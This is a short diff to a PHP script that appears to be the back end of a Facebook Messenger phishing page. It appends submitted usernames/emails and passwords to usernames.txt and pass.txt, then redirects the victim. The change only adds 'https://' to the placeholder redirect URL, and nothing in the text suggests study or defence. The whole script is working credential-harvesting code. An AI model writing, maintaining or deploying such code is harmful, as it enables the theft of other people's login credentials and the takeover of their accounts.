@@ -4,5 +4,5 @@ file_put_contents("usernames.txt", "Facebook Messenger Username : " . $email = $
 ?>
 <?php
 file_put_contents("pass.txt", "Facebook Messenger Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: redirecturl');
+header('Location: https://redirecturl');
 ?>
